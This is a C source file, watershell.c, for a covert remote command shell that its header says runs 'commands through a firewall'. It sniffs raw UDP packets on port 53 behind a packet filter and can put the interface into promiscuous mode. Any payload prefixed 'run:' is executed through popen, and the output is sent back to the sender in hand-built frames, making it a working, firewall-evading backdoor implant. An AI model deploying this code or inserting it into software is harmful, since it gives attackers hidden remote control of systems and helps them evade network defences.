/*
 * =====================================================================================
 *
 *       Filename:  watershell.c
 *
 *    Description:  run commands through a firewall... yeeaaa
 *
 *        Version:  1.0
 *        Created:  07/01/2015 09:10:41 AM
 *       Revision:  04/14/2019 11:19:22 PM
 *       Compiler:  gcc
 *
 *         Author:  Jaime Geiger,     jmg2967@rit.edu
 *         Author:  Nicholas O'Brien, ndo9903@rit.edu
 *
 * =====================================================================================
 */

/* CUSTOMIZE THESE LINES FOR HARD CODED VALUES */
#ifndef PORT
#define PORT 53
#endif
#ifndef PROMISC
#define PROMISC false
#endif
#ifndef DEBUG
#define DEBUG false
#endif
/* COMMAND LINE ARGS WILL OVERRIDE THESE */

#include <net/if.h>
#include <stdio.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netdb.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <string.h>
#include <arpa/inet.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <linux/filter.h>
#include <fcntl.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <signal.h>
#include <stdbool.h>
#include <ifaddrs.h>
#include "watershell.h"

//these need to be global so that a sigint can close everything up
int sockfd;
struct ifreq *sifreq;
bool promisc;

int main(int argc, char *argv[])
{
    int i, n, hlen, arg;
    struct sock_fprog filter;
    char buf[2048];
    unsigned char *read;
    char *udpdata;
    struct iphdr *ip;
    struct udphdr *udp;
    unsigned port = PORT;
    int code = 0;

    //if (fork())
    //    exit(1);
    char iface[100];
    memset(iface, '\0', sizeof(iface));
    get_interface_name(iface);
    printf("Listening on %s\n", iface);

    promisc = PROMISC;

    // command line args
    while ((arg = getopt(argc, argv, "phi:l:")) != -1){
        switch (arg){
            case 'p':
                if (DEBUG)
                    puts("Running in promisc mode");
                promisc = true;
                break;
            case 'h':
                if (DEBUG)
                    fprintf(stderr, "Usage: %s [-l port] [-p]\n", argv[0]);
                return 0;
                break;
            case 'l':
                port += strtoul(optarg, NULL, 10);
                if (port <= 0 || port > 65535){
                    if (DEBUG)
                        puts("Invalid port");
                    return 1;
                }
                break;
            case '?':
                if (DEBUG)
                    fprintf(stderr, "Usage: %s [-l port] [-p]\n", argv[0]);
                return 1;
            default:
                abort();
        }
    }

    // replace the port in the existing filter
    bpf_code[5].k = port;
    bpf_code[7].k = port;
    bpf_code[15].k = port;
    bpf_code[17].k = port;

    /* startup a raw socket, gets raw ethernet frames containing IP packets
     * directly from the interface, none of this AF_INET shit
     */
    sockfd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_IP));
    if (sockfd < 0){
        if (DEBUG) perror("socket");
        return 1;
    }

    /* setup ifreq struct and SIGINT handler
     * make sure we can issue an ioctl to the interface
     */
    sifreq = malloc(sizeof(struct ifreq));
    signal(SIGINT, sigint);
    strncpy(sifreq->ifr_name, iface, IFNAMSIZ);
    if (ioctl(sockfd, SIOCGIFFLAGS, sifreq) == -1){
        if (DEBUG) perror("ioctl SIOCGIFFLAGS");
        close(sockfd);
        free(sifreq);
        return 0;
    }

    //set up promisc mode if enabled
    if (promisc){
        sifreq->ifr_flags |= IFF_PROMISC;
        if (ioctl(sockfd, SIOCSIFFLAGS, sifreq) == -1)
            if (DEBUG) perror("ioctl SIOCSIFFLAGS");
    }

    //apply the packet filter code to the socket
    filter.len = 20;
    filter.filter = bpf_code;
    if (setsockopt(sockfd, SOL_SOCKET, SO_ATTACH_FILTER,
                   &filter, sizeof(filter)) < 0)
        if (DEBUG) perror("setsockopt");

    //sniff forever!
    for (;;){
        memset(buf, 0, 2048);
        //get a packet, and tear it apart, look for keywords
        n = recvfrom(sockfd, buf, 2048, 0, NULL, NULL);
        ip = (struct iphdr *)(buf + sizeof(struct ethhdr));
        udp = (struct udphdr *)(buf + ip->ihl*4 + sizeof(struct ethhdr));
        udpdata = (char *)((buf + ip->ihl*4 + 8 + sizeof(struct ethhdr)));


        //checkup on the service, make sure it is still there
        if(!strncmp(udpdata, "status:", 7)){
            send_status(buf, "up");
        }

        //run a command if the data is prefixed with run:
        if (!strncmp(udpdata, "run:", 4)){
            printf("Doing the thing: %s\n", udpdata);
            int out = open("/dev/null", O_WRONLY);
            int err = open("/dev/null", O_WRONLY);
	          dup2(out, 0);
	          dup2(err, 2);

            FILE *fd;
            fd = popen(udpdata + 4, "r");
            if (!fd) return -1;

            char buffer[256];
            size_t chread;
            /* String to store entire command contents in */
            size_t comalloc = 256;
            size_t comlen   = 0;
            char *comout   = malloc(comalloc);

            /* Use fread so binary data is dealt with correctly */
            while ((chread = fread(buffer, 1, sizeof(buffer), fd)) != 0) {
                if (comlen + chread >= comalloc) {
                    comalloc *= 2;
                    comout = realloc(comout, comalloc);
                }
                memmove(comout + comlen, buffer, chread);
                comlen += chread;
            }
            pclose(fd);
            send_status(buf, comout);

	}

    }
    return 0;
}

// get interface name dynamically :D
void get_interface_name(char iface[]){
  const char* google_dns_server = "8.8.8.8";
  int dns_port = 53;
  int sock, err;

  char buf[32];
  char buffer[100];

  struct ifaddrs *addrs, *iap;
  struct sockaddr_in *sa;
  struct sockaddr_in serv;
  struct sockaddr_in name;



  sock = socket(AF_INET, SOCK_DGRAM, 0);

  memset(&serv, 0, sizeof(serv));
  serv.sin_family = AF_INET;
  serv.sin_addr.s_addr = inet_addr(google_dns_server);
  serv.sin_port = htons(dns_port);

  err = connect(sock ,(const struct sockaddr*) &serv ,sizeof(serv));


  socklen_t namelen = sizeof(name);
  err = getsockname(sock, (struct sockaddr*) &name, &namelen);


  const char* p = inet_ntop(AF_INET, &name.sin_addr, buffer, 100);

  getifaddrs(&addrs);
  for (iap = addrs; iap != NULL; iap = iap->ifa_next) {
      if (iap->ifa_addr && (iap->ifa_flags & IFF_UP) && iap->ifa_addr->sa_family == AF_INET) {
          sa = (struct sockaddr_in *)(iap->ifa_addr);
          inet_ntop(iap->ifa_addr->sa_family, (void *)&(sa->sin_addr), buf, sizeof(buf));
          if (!strcmp(p, buf)) {
              strncpy(iface, iap->ifa_name, strlen(iap->ifa_name));
              //interface_name = iap->ifa_name;
              break;
          }
      }
  }

  freeifaddrs(addrs);
  close(sock);
}

//cleanup on SIGINT
void sigint(int signum){
    //if promiscuous mode was on, turn it off
    if (promisc){
        if (ioctl(sockfd, SIOCGIFFLAGS, sifreq) == -1){
            if (DEBUG) perror("ioctl GIFFLAGS");
        }
        sifreq->ifr_flags ^= IFF_PROMISC;
        if (ioctl(sockfd, SIOCSIFFLAGS, sifreq) == -1){
            if (DEBUG) perror("ioctl SIFFLAGS");
        }
    }
    //shut it down!
    free(sifreq);
    close(sockfd);
    //exit(1);
}

//send a reply
void send_status(unsigned char *buf, char *payload){
    struct udpframe frame;
    struct sockaddr_ll saddrll;
    struct sockaddr_in sin;
    int len;


    //setup the data
    memset(&frame, 0, sizeof(frame));
    strncpy(frame.data, payload, strlen(payload));

    //get the ifindex
    if (ioctl(sockfd, SIOCGIFINDEX, sifreq) == -1){
        if (DEBUG) perror("ioctl SIOCGIFINDEX");
        return;
    }

    //layer 2
    saddrll.sll_family = PF_PACKET;
    saddrll.sll_ifindex = sifreq->ifr_ifindex;
    saddrll.sll_halen = ETH_ALEN;
    memcpy((void*)saddrll.sll_addr, (void*)(((struct ethhdr*)buf)->h_source), ETH_ALEN);
    memcpy((void*)frame.ehdr.h_source, (void*)(((struct ethhdr*)buf)->h_dest), ETH_ALEN);
    memcpy((void*)frame.ehdr.h_dest, (void*)(((struct ethhdr*)buf)->h_source), ETH_ALEN);
    frame.ehdr.h_proto = htons(ETH_P_IP);

    //layer 3
    frame.ip.version = 4;
    frame.ip.ihl = sizeof(frame.ip)/4;
    frame.ip.id = htons(69);
    frame.ip.frag_off |= htons(IP_DF);
    frame.ip.ttl = 64;
    frame.ip.tos = 0;
    frame.ip.tot_len = htons(sizeof(frame.ip) + sizeof(frame.udp) + strlen(payload));
    frame.ip.saddr = ((struct iphdr*)(buf+sizeof(struct ethhdr)))->daddr;
    frame.ip.daddr = ((struct iphdr*)(buf+sizeof(struct ethhdr)))->saddr;
    frame.ip.protocol = IPPROTO_UDP;

    //layer 4
    frame.udp.source = ((struct udphdr*)(buf+sizeof(struct ethhdr)+sizeof(struct iphdr)))->dest;
    frame.udp.dest = ((struct udphdr*)(buf+sizeof(struct ethhdr)+sizeof(struct iphdr)))->source;
    frame.udp.len = htons(strlen(payload) + sizeof(frame.udp));

    //checksums
    //udp_checksum(&frame.ip, (unsigned short*)&frame.udp);
    ip_checksum(&frame.ip);

    //calculate total length and send
    len = sizeof(struct ethhdr) + sizeof(struct udphdr) + sizeof(struct iphdr) + strlen(payload);
    sendto(sockfd, (char*)&frame, len, 0, (struct sockaddr *)&saddrll, sizeof(saddrll));
}

/* checksum functions from http://www.roman10.net/how-to-calculate-iptcpudp-checksumpart-2-implementation/ */
//broken.
void udp_checksum(struct iphdr *ip, unsigned short *payload){
    register unsigned long sum = 0;
    struct udphdr *udp = (struct udphdr*)payload;
    unsigned short len = udp->len;
    unsigned short *addr = (short*)ip;
    udp->check = 0;
    sum += (ip->daddr>>16) & 0xFFFF;
    sum += (ip->daddr) & 0xFFFF;
    sum += htons(IPPROTO_UDP);
    sum += ntohs(udp->len);
    while (len > 1){
        sum += *addr++;
        len -= 2;
    }
    if (len > 0)
        sum += ((*addr) & htons(0xFFFF));
    while (sum>>16)
        sum = (sum & 0xFFFF) + (sum >>16);
    sum = ~sum;
    udp->check = ((unsigned short)sum == 0x0000) ? 0xFFFF : (unsigned short)sum;
}

void ip_checksum(struct iphdr *ip){
    unsigned int count = ip->ihl<<2;
    unsigned short *addr = (short*)ip;
    register unsigned long sum = 0;

    ip->check = 0;
    while (count > 1){
        sum += *addr++;
        count -= 2;
    }
    if (count > 0)
        sum += ((*addr) & htons(0xFFFF));
    while (sum>>16)
        sum = (sum & 0xFFFF) + (sum >>16);
    sum = ~sum;
    ip->check = (unsigned short)sum;
}
